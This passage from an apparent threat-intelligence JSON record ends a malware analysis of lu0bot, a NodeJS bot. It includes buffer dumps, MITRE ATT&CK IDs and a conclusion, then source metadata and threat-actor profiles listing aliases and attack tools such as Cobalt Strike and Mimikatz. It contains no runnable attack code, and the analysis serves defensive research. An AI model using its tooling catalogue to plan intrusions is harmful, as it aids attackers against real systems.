[Function: mp_loss],\n mp_del: [Function: mp_del],\n mp_dtchk: [Function: mp_dtchk],\n mp_dtsum: [Function: mp_dtsum],\n mp_pset: [Function: mp_pset],\n mp_opnew: [Function: mp_opnew],\n mp_opstat: [Function: mp_opstat] }\nlq\n{ ' XXXXXXXXXXXXX': [ 1, <Buffer 31> ],\n ' XXXXXXXXXXXXX': [ 1, <Buffer 31> ],\n ' XXXXXXXXXXXXX': [ 1, <Buffer 31> ],\n ' XXXXXXXXXXXXX': [ 1, <Buffer 31> ],\n\n```\n\n-----\n\n```\n  XXXXXXXXXXXXX : [ 1, <Buffer 31> ],\n ' XXXXXXXXXXXXX': [ 1, <Buffer 31> ],\n ' XXXXXXXXXXXXX': [ 1, <Buffer 31> ],\n ' XXXXXXXXXXXXX': [ 1, <Buffer 31> ],\n ' XXXXXXXXXXXXX': [ 1, <Buffer 31> ],\n ' XXXXXXXXXXXXX': [ 1, <Buffer 31> ],\n ' XXXXXXXXXXXXX': [ 1, <Buffer 31> ],\n ' XXXXXXXXXXXXX': [ 1, <Buffer 31> ],\n ' XXXXXXXXXXXXX': [ 1, <Buffer 30 00 00 00 00 09 00 00 26 02> ],\n ' XXXXXXXXXXXXX': [ 1, <Buffer 74 72 75 65> ],\n ' XXXXXXXXXXXXX': [ 1, <Buffer 74 72 75 65> ],\n ' XXXXXXXXXXXXX': [ 1, <Buffer 37 39 38> ],\n ' XXXXXXXXXXXXX': [ 1, <Buffer 31> ],\n ' XXXXXXXXXXXXX': [ 1, <Buffer 31> ],\n ' XXXXXXXXXXXXX': [ 1, <Buffer 31> ],\n ' XXXXXXXXXXXXX': [ 1, <Buffer 31> ],\n ' XXXXXXXXXXXXX': [ 1, <Buffer 31> ],\n ' XXXXXXXXXXXXX': [ 1, <Buffer 31> ],\n ' XXXXXXXXXXXXX': [ 1, <Buffer 31> ],\n ' XXXXXXXXXXXXX': [ 1, <Buffer 31> ],\n ' XXXXXXXXXXXXX': [ 1, <Buffer 31> ],\n ' XXXXXXXXXXXXX': [ 1, <Buffer 31> ],\n ' XXXXXXXXXXXXX': [ 1, <Buffer 37 39 38> ],\n ' XXXXXXXXXXXXX': [ 1, <Buffer 31> ],\n ' XXXXXXXXXXXXX': [ 1, <Buffer 31> ],\n ' XXXXXXXXXXXXX': [ 1, <Buffer 31> ] \n}\n\n### MITRE ATT&CK\n\n#### T1059 T1482 T1083 T1046 T1057 T1518 T1082 T1614 T1016 T1124 T1005 T1008 T1571\n\n### ELI5 summary\n\n#### lu0bot is a NodeJS Malware. Network communications are mixing TCP (loader) and UDP (main stage). It’s pushed at least with Garbage Cleaner.\n\n```\n\n-----\n\n#### Its default setup seems to be a aggressive telemetry harvester. Due to its task manager architecture it is technically able to be everything.\n\n## Conclusion\n\n#### Lu0bot is a curious piece of code which I could admit, even if I don’t like at all NodeJS/JavaScript code, the task manager succeeded in mindblowing me for its ingeniosity.\n\n\n-----\n\n#### A wild fumik0_ being\n\n amazed by the task manager implementation\n\n I have more questions than answers since then I started to put my hands on that one, but the thing that I’m sure, it’s active and harvesting data from bots that I have never seen before in such an aggressive way.\n\n Special thanks: @benkow_\n\n\n-----",
+    "language": "EN",
+    "sources": [
+        {
+            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
+            "created_at": "2023-01-12T14:38:44.599904Z",
+            "updated_at": "2023-01-12T14:38:44.599904Z",
+            "deleted_at": null,
+            "name": "VXUG",
+            "url": "https://www.vx-underground.org",
+            "description": "vx-underground Papers",
+            "reports": null
+        }
+    ],
+    "references": [
+        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-06-24 - Lu0bot – An unknown NodeJS malware using UDP.pdf"
+    ],
+    "report_names": [
+        "2021-06-24 - Lu0bot – An unknown NodeJS malware using UDP.pdf"
+    ],
+    "threat_actors": [
+        {
+            "id": "81dde5cc-c29f-430d-8c6e-e5e92d5015e7",
+            "created_at": "2022-10-25T16:07:23.704358Z",
+            "updated_at": "2025-03-27T02:02:09.932453Z",
+            "deleted_at": null,
+            "main_name": "Harvester",
+            "aliases": [],
+            "source_name": "ETDA:Harvester",
+            "tools": [
+                "Agentemis",
+                "Cobalt Strike",
+                "CobaltStrike",
+                "Graphon",
+                "Metasploit",
+                "cobeacon"
+            ],
+            "source_id": "ETDA",
+            "reports": null
+        },
+        {
+            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
+            "created_at": "2022-10-25T16:07:23.773944Z",
+            "updated_at": "2025-03-27T02:02:09.974695Z",
+            "deleted_at": null,
+            "main_name": "Lead",
+            "aliases": [
+                "Casper",
+                "TG-3279"
+            ],
+            "source_name": "ETDA:Lead",
+            "tools": [
+                "Agentemis",
+                "BleDoor",
+                "Cobalt Strike",
+                "CobaltStrike",
+                "RbDoor",
+                "RibDoor",
+                "Winnti",
+                "cobeacon"
+            ],
+            "source_id": "ETDA",
+            "reports": null
+        },
+        {
+            "id": "f8dddd06-da24-4184-9e24-4c22bdd1cbbf",
+            "created_at": "2023-01-06T13:46:38.626906Z",
+            "updated_at": "2025-03-27T02:00:02.877001Z",
+            "deleted_at": null,
+            "main_name": "Tick",
+            "aliases": [
+                "Stalker Taurus",
+                "PLA Unit 61419",
+                "Nian",
+                "BRONZE BUTLER",
+                "REDBALDKNIGHT",
+                "STALKER PANDA",
+                "G0060"
+            ],
+            "source_name": "MISPGALAXY:Tick",
+            "tools": [],
+            "source_id": "MISPGALAXY",
+            "reports": null
+        },
+        {
+            "id": "f4f16213-7a22-4527-aecb-b964c64c2c46",
+            "created_at": "2024-06-19T02:03:08.090932Z",
+            "updated_at": "2025-03-27T02:05:17.387119Z",
+            "deleted_at": null,
+            "main_name": "GOLD NIAGARA",
+            "aliases": [
+                "Carbanak",
+                "Carbon Spider ",
+                "FIN7 ",
+                "Navigator ",
+                "Sangria Tempest ",
+                "TelePort Crew ",
+                "Calcium "
+            ],
+            "source_name": "Secureworks:GOLD NIAGARA",
+            "tools": [
+                " Carbanak",
+                " Cobalt Strike",
+                " DICELOADER",
+                " DRIFTPIN",
+                " GGLDR",
+                " GRIFFON",
+                " JSSLoader",
+                " Meterpreter",
+                " OFFTRACK",
+                " PILLOWMINT",
+                " POWERTRASH",
+                " SUPERSOFT",
+                " TAKEOUT",
+                " TinyMet",
+                "Bateleur"
+            ],
+            "source_id": "Secureworks",
+            "reports": null
+        },
+        {
+            "id": "d4e7cd9a-2290-4f89-a645-85b9a46d004b",
+            "created_at": "2022-10-25T16:07:23.419513Z",
+            "updated_at": "2025-03-27T02:02:09.790389Z",
+            "deleted_at": null,
+            "main_name": "Bronze Butler",
+            "aliases": [
+                "Bronze Butler",
+                "CTG-2006",
+                "Operation ENDTRADE",
+                "RedBaldNight",
+                "Stalker Panda",
+                "Stalker Taurus",
+                "TEMP.Tick",
+                "Tick"
+            ],
+            "source_name": "ETDA:Bronze Butler",
+            "tools": [
+                "8.t Dropper",
+                "8.t RTF exploit builder",
+                "8t_dropper",
+                "9002 RAT",
+                "AngryRebel",
+                "Blogspot",
+                "Daserf",
+                "Datper",
+                "Elirks",
+                "Farfli",
+                "Gh0st RAT",
+                "Ghost RAT",
+                "HOMEUNIX",
+                "HidraQ",
+                "HomamDownloader",
+                "Homux",
+                "Hydraq",
+                "Lilith",
+                "Lilith RAT",
+                "McRAT",
+                "MdmBot",
+                "Mimikatz",
+                "Minzen",
+                "Moudour",
+                "Muirim",
+                "Mydoor",
+                "Nioupale",
+                "PCRat",
+                "POISONPLUG.SHADOW",
+                "Roarur",
+                "RoyalRoad",
+                "ShadowPad Winnti",
+                "ShadowWali",
+                "ShadowWalker",
+                "SymonLoader",
+                "WCE",
+                "Wali",
+                "Windows Credential Editor",
+                "Windows Credentials Editor",
+                "XShellGhost",
+                "XXMM",
+                "gsecdump",
+                "rarstar"
+            ],
+            "source_id": "ETDA",
+            "reports": null
+        },
+        {
+            "id": "bf0489c5-1c07-41e6-91c9-855ad96ccc6a",
+            "created_at": "2022-10-25T16:47:55.541639Z",
+            "updated_at": "2025-03-27T02:05:17.253496Z",
+            "deleted_at": null,
+            "main_name": "BRONZE BUTLER",
+            "aliases": [
+                "Daserf",
+                "Stalker Panda ",
+                "Tick ",
+                "CTG-2006 "
+            ],
+            "source_name": "Secureworks:BRONZE BUTLER",
+            "tools": [
+                " DGet",
+                " Daserf",
+                " Datper",
+                " Gofarer",
+                " MSGet",
+                " Mimikatz",
+                " RarStar",
+                " Screen Capture Tool",
+                " ShadowPad",
+                " T-SMB",
+                " WinRAR",
+                " Windows Credential Editor",
+                " gsecdump",
+                " xmm downloader",
+                " xxmm",
+                "ABK"
+            ],
+            "source_id": "Secureworks",
+            "reports": null
+        }
+    ],
+    "ts_created_at": 1673535591,
+    "ts_updated_at": 1743041761,
+    "ts_creation_date": 1653700875,
+    "ts_modification_date": 1653700875,
+    "files": {
+        "pdf": "https://archive.orkl.eu/9898531750b04fbc45593858d47e21abb79cae28.pdf",
+        "text": "https://archive.orkl.eu/9898531750b04fbc45593858d47e21abb79cae28.txt",
+        "img": "https://archive.orkl.eu/9898531750b04fbc45593858d47e21abb79cae28.jpg"
+    }
+}
